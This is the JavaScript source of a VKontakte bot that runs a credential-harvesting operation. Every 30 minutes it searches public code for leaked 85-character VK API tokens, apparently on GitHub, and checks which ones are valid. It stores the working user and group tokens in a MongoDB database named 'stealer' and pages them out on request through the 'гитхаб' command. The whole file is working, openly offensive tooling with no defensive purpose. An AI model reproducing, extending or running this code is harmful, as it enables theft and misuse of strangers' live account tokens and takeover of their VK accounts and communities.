const fs = require("fs");
const { VK, Keyboard } = require('vk-io');
const { HearManager } = require('@vk-io/hear');
const MongoClient = require("mongodb").MongoClient;
const { db_get_collection, db_add, db_available_value, db_delete_value } = require("../lib/db.js")
const { get_tokens } = require("../lib/stealer.js");
const { get_vk_messages } = require('./handler.js')
const { vk_checker, valid_token } = require("./checker.js");

const client = new MongoClient(
    process.env.MONGO_STEALER_LINK,
    { useUnifiedTopology: true },
);

const vk = new VK({
    token: process.env.VK_STEALER_BOT_TOKEN
});

const hearManager = new HearManager();

vk.updates.on('message_new', (context, next) => {
	const { messagePayload } = context;

    fs.appendFile(`logs/${context.peerId}`, JSON.stringify(context)+"\n", (e) => e == null ? null : console.log(e))

    if (messagePayload && messagePayload.command && messagePayload.arg) {
        context.state.command = messagePayload.command
        context.state.arg = messagePayload.arg
    } else if (context.text) {
        context.state.command = context.text.split(' ')[0]
        context.state.arg = context.text.split(' ')[1]
    } else {
        context.state.command = "undefined command"
    }
    
    return next();
});

vk.updates.on('message_new', hearManager.middleware);

const hearCommand = (name, handle) => {
	hearManager.hear(
		[
			(text, { state }) => (
                state.command.match(name)
			),
			name
		],
		handle
	);
};

client.connect(async function(err, client) {
    const db = client.db("stealer")
    const users = db.collection("users");
    const groups = db.collection("groups");
    
    hearCommand(/гитхаб/i, async (context) => {
    
        let current_offset = context.messagePayload && context.messagePayload.offset
        ? context.messagePayload.offset
        : 0

        let collection_type;
        let sort;
        let page = context.state.arg
        ? context.state.arg
        : undefined

        switch (page) {
            case "группы":
                collection_type = groups;
                sort = {
                    members: -1,
                    _id: 1
                }
                break
            case "юзеры":
                collection_type = users
                sort = {}
                break
            default:
                context.send("Невалидное значение аргумента")
                throw new Error("Invalid arg");
        }

        let checks = await db_get_collection(collection_type, sort, current_offset, 3);

        if (checks !== undefined && Object.keys(checks).length > 0) {
            let message_text = await get_vk_messages(checks)
            context.send({
                message: message_text.join("\n"),
                keyboard: Keyboard.builder()
                    .textButton({
                    label: '⬅',
                        payload: {
                            command: `гитхаб`,
                            arg: page,
                            offset: current_offset-3
                        }
                    })
                    .textButton({
                        label: '➡',
                        payload: {
                            command: `гитхаб`,
                            arg: page,
                            offset: current_offset+3
                        }
                    })
                    .row()
                    .inline()
            })
        } else {
            context.send({
                message: "Нет данных"
            })
        }
    });

    hearCommand(/undefined command/, (context) => {
        if (context.peerId < 2000000000) {
            context.send(message = "Не понял Вас")
        }
    })

    async function dbupdate() {
        while (true) {
            let new_tokens = await get_tokens('import vk_api', /['"]([a-zA-Z0-9]{85})['"]/);
            let new_checks = await vk_checker(new_tokens);

            await Promise.all(new_checks.map(async (check) => {
                switch (check.type) {
                    case "user":
                        if (await db_available_value(users, { token: check.token })) {
                            db_add(users, check)
                        }
                        break
                    case "group":
                        if ( await db_available_value(groups, { token: check.token })) {
                            db_add(groups, check)
                        }
                        break
                }
            }))

            console.log("updated db")
            await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
        };
    };

    async function dbclear() {
        while (true) {
            let db_users = await db_get_collection(users)
            let db_groups = await db_get_collection(groups)

            let user_check = db_users.map(async (check) => {
                if (!await valid_token(check.token)) {
                    console.log("del")
                    db_delete_value(users, { "_id": check._id })
                }
            })
            let group_check = db_groups.map(async (check) => {
                if (!await valid_token(check.token)) {
                    console.log("del")
                    db_delete_value(groups, { "_id": check._id })
                }
            })

            await Promise.all([user_check, group_check]);
            console.log("cleared db")
            await new Promise(resolve => setTimeout(resolve, 30 * 60 * 1000)); //спим 30 мин
        };
    };
    
    dbclear();
    dbupdate();
    vk.updates.start().catch(console.error);
});